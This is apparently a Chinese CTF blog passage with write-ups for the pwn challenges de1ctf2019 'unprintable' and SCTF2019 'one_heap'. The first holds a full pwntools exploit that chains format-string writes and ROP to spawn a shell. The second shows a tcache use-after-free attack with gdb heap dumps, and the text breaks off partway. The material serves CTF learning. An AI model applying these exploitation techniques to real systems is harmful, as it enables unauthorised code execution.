title="de1ctf2019_unprintable"></a>de1ctf2019_unprintable</h3><p>19/08/31</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>利用栈上留下的指针劫持exit函数的执行流:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RBX</span>  <span class="number">0x7f7ec22d9168</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="built_in">R12</span>  <span class="number">0x600dd8</span> (__do_global_dtors_aux_fini_array_entry)</span><br><span class="line">► <span class="number">0x7f7ec20c2dd4</span> &lt;_dl_fini+<span class="number">788</span>&gt;    <span class="keyword">add</span>    <span class="built_in">r12</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span>] &lt;<span class="number">0x600dd8</span>&gt;</span><br><span class="line">...</span><br><span class="line"><span class="built_in">RDX</span>  <span class="number">0x0</span></span><br><span class="line">► <span class="number">0x7f7ec20c2df3</span> &lt;_dl_fini+<span class="number">819</span>&gt;    <span class="keyword">call</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r12</span> + <span class="built_in">rdx</span>*<span class="number">8</span>] &lt;<span class="number">0x4006e0</span>&gt;</span><br><span class="line"><span class="symbol">       rdi:</span> <span class="number">0x7f7ec22d8948</span> (_rtld_global+<span class="number">2312</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rsi:</span> <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rdx:</span> <span class="number">0x0</span></span><br><span class="line"><span class="symbol">       rcx:</span> <span class="number">0x4</span></span><br></pre></td></tr></table></figure></p><p>这里的<code>0x7f7ec22d9168</code>就保存在栈上，可以利用格式化串修改它的值，将r12指向bss段上可控的buf里，这样就可以劫持exit的执行流，再次执行一次printf.<br>在第一次执行printf的时候还可以修改栈中的指针指向第二次执行printf的返回地址，第二次执行printf的时候就可以利用这个指针修改自己的返回地址，这样就可以造成无限循环使用printf</p><h4 id="修改stdout的fileno"><a href="#修改stdout的fileno" class="headerlink" title="修改stdout的fileno:"></a>修改stdout的fileno:</h4><p>程序关闭了stdout，修改stdout的fileno为2，这样就可以让程序重新输出:<br><img src="/2019/08/31/复现近几个月比赛不会做的题/1.png" alt=""></p><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP:"></a>ROP:</h4><p>栈转移:<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000000040082d</span> : <span class="keyword">pop</span> rsp ; <span class="keyword">pop</span> r13 ; <span class="keyword">pop</span> r14 ; <span class="keyword">pop</span> r15 ; ret</span><br></pre></td></tr></table></figure></p><p>利用格式化串修改printf的返回地址和和返回地址下面一格的位置，将栈转移到可控的buf里</p><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./unprintable"</span>)</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x0000000004007C1)</span></span><br><span class="line"><span class="string">    b *0x000000000601160</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsb</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    a.send(payload)</span><br><span class="line">flag=<span class="keyword">False</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x0000000000400690</span></span><br><span class="line">pop_rsp_pop3_ret=<span class="number">0x000000000040082d</span><span class="comment">#pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">add_ret=<span class="number">0x0000000004006E8</span> <span class="comment"># adc     [rbp+48h], edx</span></span><br><span class="line"><span class="comment">#target=0x60101f</span></span><br><span class="line">stdout=<span class="number">0x000000000601020</span></span><br><span class="line">pop_rbx_pop5_ret=<span class="number">0x00000000040082A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400833</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        a=process(<span class="string">"./unprintable"</span>)</span><br><span class="line">        fini_addr=<span class="number">0x600dd8</span></span><br><span class="line">        a.recvuntil(<span class="string">"This is your gift: "</span>)</span><br><span class="line">        stack_addr=eval(a.recv(<span class="number">14</span>))</span><br><span class="line">        <span class="keyword">if</span> stack_addr&amp;<span class="number">0xffff</span> &lt; <span class="number">0x2000</span>:</span><br><span class="line">        </span><br><span class="line">            success(<span class="string">"stack_addr ==&gt; 0x%x"</span>%stack_addr)</span><br><span class="line">            sec_printf_ret=stack_addr<span class="number">-0x120</span></span><br><span class="line">            success(<span class="string">"printf_ret ==&gt; 0x%x"</span>%sec_printf_ret)</span><br><span class="line"></span><br><span class="line">            payload=<span class="string">"%748c%26$n"</span><span class="comment"># 修改指针</span></span><br><span class="line">            payload+=<span class="string">'%'</span>+str((sec_printf_ret&amp;<span class="number">0xffff</span>)<span class="number">-748</span>)+<span class="string">'c'</span>+<span class="string">"%11$hn"</span></span><br><span class="line">            payload=payload.ljust(<span class="number">100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">            payload+=p64(<span class="number">0x0000000004007A3</span>)       </span><br><span class="line">            a.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">            ret_addr=<span class="number">0x4007A3</span>&amp;<span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((sec_printf_ret+<span class="number">8</span>)&amp;<span class="number">0xffff</span>)<span class="number">-0x7a3</span> &lt; <span class="number">0</span> :</span><br><span class="line">                flag=<span class="keyword">False</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            payload=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span>+<span class="string">'\x00'</span> <span class="comment"># 修改printf的返回地址</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>)) </span><br><span class="line">            payload=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            payload+=<span class="string">"%"</span>+str(((sec_printf_ret+<span class="number">8</span>)&amp;<span class="number">0xffff</span>)<span class="number">-0x7a3</span>)+<span class="string">"c"</span>+<span class="string">"%60$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">            payload=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            payload+=<span class="string">'%'</span>+str((<span class="number">0x000000000601160</span>&amp;<span class="number">0xffff</span>)<span class="number">-0x7a3</span>)+<span class="string">'c'</span>+<span class="string">"%74$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">            payload=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            payload+=<span class="string">"%"</span>+str(((sec_printf_ret+<span class="number">8</span>+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)<span class="number">-0x7a3</span>)+<span class="string">"c"</span>+<span class="string">"%60$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))  </span><br><span class="line"></span><br><span class="line">            payload=<span class="string">'%'</span>+str(((<span class="number">0x000000000601160</span>&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))+<span class="string">'c'</span>+<span class="string">"%74$hn"</span></span><br><span class="line">            payload+=<span class="string">'%'</span>+str(ret_addr-((<span class="number">0x000000000601160</span>&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">            payload=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            payload+=<span class="string">"%"</span>+str(((sec_printf_ret+<span class="number">8</span>+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)<span class="number">-0x7a3</span>)+<span class="string">"c"</span>+<span class="string">"%60$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))  </span><br><span class="line">    </span><br><span class="line">            payload=<span class="string">"%74$hn"</span></span><br><span class="line">            payload+=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">            <span class="comment">#debug()</span></span><br><span class="line">            </span><br><span class="line">            target_addr=stack_addr<span class="number">-0x68</span></span><br><span class="line">            payload=<span class="string">'%'</span>+str(ret_addr)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            payload+=<span class="string">"%"</span>+str((target_addr&amp;<span class="number">0xffff</span>)<span class="number">-0x7a3</span>)+<span class="string">"c"</span>+<span class="string">"%60$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            payload=<span class="string">"%"</span>+str(<span class="number">0x690</span>)+<span class="string">"c%74$hn"</span></span><br><span class="line">            payload+=<span class="string">'%'</span>+str(ret_addr<span class="number">-0x690</span>)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>)) <span class="comment"># 这步需要set下</span></span><br><span class="line">            <span class="comment">#debug()</span></span><br><span class="line">            payload=<span class="string">"%2c%28$hn"</span></span><br><span class="line">            payload+=<span class="string">'%'</span>+str(ret_addr<span class="number">-2</span>)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))  <span class="comment"># 将fileno = 2</span></span><br><span class="line"></span><br><span class="line">            payload=<span class="string">'%'</span>+str(pop_rsp_pop3_ret&amp;<span class="number">0xffff</span>)+<span class="string">'c'</span>+<span class="string">"%72$hn"</span></span><br><span class="line">            payload=payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">            rop=p64(<span class="number">1</span>)*<span class="number">3</span><span class="comment">#temp</span></span><br><span class="line">            rop+=p64(pop_rdi_ret)</span><br><span class="line">            rop+=p64(puts_got)</span><br><span class="line">            rop+=p64(puts_plt)</span><br><span class="line">            rop+=p64(<span class="number">0x00000000040082A</span>)<span class="comment">#foot</span></span><br><span class="line">            rop+=p64(<span class="number">0</span>)</span><br><span class="line">            rop+=p64(<span class="number">1</span>)</span><br><span class="line">            rop+=p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">            rop+=p64(<span class="number">0x3000</span>)</span><br><span class="line">            rop+=p64(<span class="number">0x000000000601160</span>+<span class="number">14</span>*<span class="number">8</span>+<span class="number">56</span>)</span><br><span class="line">            rop+=p64(<span class="number">0</span>)</span><br><span class="line">            rop+=p64(<span class="number">0x000000000400810</span>)</span><br><span class="line">            rop+=<span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">            payload+=rop</span><br><span class="line">            a.send(payload.ljust(<span class="number">0x1000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">            puts_addr=u64(a.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">            success(<span class="string">"puts_addr ==&gt; 0x%x"</span>%puts_addr)</span><br><span class="line">            libc_base=puts_addr-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">            system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">            bin_sh_addr=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">            pop5_ret=<span class="number">0x000000000040082b</span></span><br><span class="line">            rop2=(p64(pop5_ret)+p64(<span class="number">0</span>)*<span class="number">5</span>)*<span class="number">100</span></span><br><span class="line">            rop2+=p64(pop_rdi_ret)</span><br><span class="line">            rop2+=p64(bin_sh_addr)</span><br><span class="line">            rop2+=p64(system_addr)</span><br><span class="line">            a.send(rop2.ljust(<span class="number">0x3000</span>,<span class="string">'\x00'</span>))</span><br><span class="line">            flag=<span class="keyword">True</span></span><br><span class="line">            a.interactive()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="SCTF2019-one-heap"><a href="#SCTF2019-one-heap" class="headerlink" title="SCTF2019-one_heap"></a>SCTF2019-one_heap</h3><p>19/08/31</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>程序是2.27的,没有打印功能，且保护全开。<br>add函数只能malloc size&lt;0x88的chunk:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v0 = read_str2l();</span><br><span class="line">v1 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line"><span class="keyword">if</span> ( v0 &gt; <span class="number">0x7F</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">&#125;</span><br><span class="line">_printf_chk(<span class="number">1L</span>L, <span class="string">"Input the content:"</span>);</span><br><span class="line">ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">my_read(ptr, v1);</span><br></pre></td></tr></table></figure></p><p>delete函数中存在UAF:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !free_times )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  --free_times;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>delete函数有次数限制，只能free 4次:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.<span class="string">data:</span><span class="number">0000000000202010</span> malloc_times    dd <span class="number">15</span>                   ; DATA <span class="string">XREF:</span> <span class="keyword">new</span>+<span class="number">15</span>↑r</span><br><span class="line">.<span class="string">data:</span><span class="number">0000000000202010</span>                                         ; <span class="keyword">new</span>+<span class="number">7</span>E↑w</span><br><span class="line">.<span class="string">data:</span><span class="number">0000000000202014</span> free_times      dd <span class="number">4</span>                    ; DATA <span class="string">XREF:</span> delete+<span class="number">14</span>↑r</span><br></pre></td></tr></table></figure></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>如果没有free次数的限制，则可以连续free 一个size不属于fastbin的chunk 8次，这样他在tcache和unsorted bin中都存在，且fd指向了libc内部，再申请一个小chunk进行部分覆写，即可指向stdout进行信息泄露.<br>这道题只能free 4次，参考wp是将chunk申请到tcache_perthread_struct，写入\xff将tcache填满,然后再将存放tcache_perthread_struct的chunk free掉，这样它就进入了unsorted bin中，再次申请一个小chunk，会从unsorted bin chunk中进行切割，然后会在tcache_perthread_struct中存放指针的位置写入libc的地址，再进行部分覆写即可指向stdout进行泄露.</p><h5 id="将chunk申请到tcache-perthread-struct"><a href="#将chunk申请到tcache-perthread-struct" class="headerlink" title="将chunk申请到tcache_perthread_struct"></a>将chunk申请到tcache_perthread_struct</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=process(<span class="string">"./one_heap"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'A\n'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'\x10\x70\n'</span>)</span><br></pre></td></tr></table></figure><p>此时tcache的情况如下:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0</span>x80 [  <span class="number">1</span>]: <span class="number">0</span>x5<span class="number">55555757260</span> —▸ <span class="number">0</span>x5<span class="number">55555757010</span> ◂— <span class="number">0</span>x10<span class="number">00000000000</span></span><br></pre></td></tr></table></figure></p><p>然后连续add两次申请tcache_perthread_struct<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>,<span class="string">'A\n'</span>)</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'\x00'</span>*<span class="number">5</span>+<span class="string">'\xff'</span>*<span class="number">31</span>+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure></p><h5 id="free掉tcache-perthread-struct"><a href="#free掉tcache-perthread-struct" class="headerlink" title="free掉tcache_perthread_struct"></a>free掉tcache_perthread_struct</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete()</span><br></pre></td></tr></table></figure><p>bins的情况如下:<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tcachebins</span></span><br><span class="line"><span class="attribute">0x20 [-96]</span>: 0x0</span><br><span class="line"><span class="attribute">0x30 [ -4]</span>: 0x0</span><br><span class="line"><span class="attribute">0x40 [-36]</span>: 0x0</span><br><span class="line"><span class="attribute">0x50 [ -9]</span>: 0x0</span><br><span class="line"><span class="attribute">0x60 [ -1]</span>: 0x0</span><br><span class="line"><span class="attribute">0x70 [127]</span>: 0x0</span><br><span class="line"><span class="attribute">0xa0 [-96]</span>: 0x0</span><br><span class="line"><span class="attribute">0xb0 [ -4]</span>: 0x0</span><br><span class="line"><span class="attribute">0xc0 [-36]</span>: 0x0</span><br><span class="line"><span class="attribute">0xd0 [ -9]</span>: 0x0</span><br><span class="line"><span class="attribute">0xe0 [ -1]</span>: 0x0</span><br><span class="line"><span class="attribute">0xf0 [127]</span>: 0x0</span><br><span class="line"><span class="attribute">0x120 [ -1]</span>: 0x0</span><br><span class="line"><span class="attribute">0x130 [ -1]</span>: 0x0</span><br><span class="line"><span class="attribute">0x140 [ -1]</span>: 0x0</span><br><span class="line">...</span><br><span class="line"><span class="attribute">0x240 [ -1]</span>: 0x0</span><br><span class="line"><span class="attribute">0x250 [ -1]</span>: 0x0</span><br><span class="line"><span class="attribute">fastbins</span></span><br><span class="line"><span class="attribute">0x20</span>: 0x0</span><br><span class="line"><span class="attribute">0x30</span>: 0x0</span><br><span class="line"><span class="attribute">0x40</span>: 0x0</span><br><span class="line"><span class="attribute">0x50</span>: 0x0</span><br><span class="line"><span class="attribute">0x60</span>: 0x0</span><br><span class="line"><span class="attribute">0x70</span>: 0x0</span><br><span class="line"><span class="attribute">0x80</span>: 0x0</span><br><span class="line"><span class="attribute">unsortedbin</span></span><br><span class="line"><span class="attribute">all</span>: 0x555555757000 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757000</span><br><span class="line"><span class="attribute">smallbins</span></span><br><span class="line"><span class="attribute">empty</span></span><br></pre></td></tr></table></figure></p><p>再add一个chunk:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>,<span class="string">'A\n'</span>)</span><br></pre></td></tr></table></figure></p><p>此时tcache的情况如下:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tcachebins</span></span><br><span class="line"><span class="selector-tag">0x20</span> <span class="selector-attr">[ 65]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x30</span> <span class="selector-attr">[ -2]</span>: <span class="selector-tag">0x201</span></span><br><span class="line"><span class="selector-tag">0x40</span> <span class="selector-attr">[-36]</span>: <span class="selector-tag">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="selector-tag">0x5555557572d0</span> ◂— <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x50</span> <span class="selector-attr">[ -9]</span>: <span class="selector-tag">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="selector-tag">0x5555557572d0</span> ◂— <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x60</span> <span class="selector-attr">[ -1]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x70</span> <span class="selector-attr">[127]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0xa0</span> <span class="selector-attr">[-32]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0xb0</span> <span class="selector-attr">[ -2]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0xc0</span> <span class="selector-attr">[-36]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0xd0</span> <span class="selector-attr">[ -9]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0xe0</span> <span class="selector-attr">[ -1]</span>: <span class="selector-tag">0x0</span></span><br></pre></td></tr></table></figure></p><h5 id="进行部分覆写"><a href="#进行部分覆写" class="headerlink" title="进行部分覆写:"></a>进行部分覆写:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x60\x07\n'</span>)</span><br></pre></td></tr></table></figure><p>此时tcache:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tcachebins</span></span><br><span class="line"><span class="selector-tag">0x20</span> <span class="selector-attr">[ 65]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x30</span> <span class="selector-attr">[ -2]</span>: <span class="selector-tag">0x21</span></span><br><span class="line"><span class="selector-tag">0x40</span> <span class="selector-attr">[-36]</span>: <span class="selector-tag">0x7ffff7dd0760</span> (_IO_2_1_stdout_) ◂— <span class="selector-tag">0xfbad2887</span></span><br><span class="line"><span class="selector-tag">0x50</span> <span class="selector-attr">[ -9]</span>: <span class="selector-tag">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="selector-tag">0x5555557572d0</span> ◂— <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x60</span> <span class="selector-attr">[ -1]</span>: <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x70</span> <span class="selector-attr">[127]</span>: <span class="selector-tag">0x1e1</span></span><br><span class="line"><span class="selector-tag">0x80</span> <span class="selector-attr">[  0]</span>: <span class="selector-tag">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="selector-tag">0x5555557572d0</span> ◂— <span class="selector-tag">0x0</span></span><br><span class="line"><span class="selector-tag">0x90</span> <span class="selector-attr">[  0]</span>: <span class="selector-tag">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="selector-tag">0x5555557572d0</span> ◂— <span 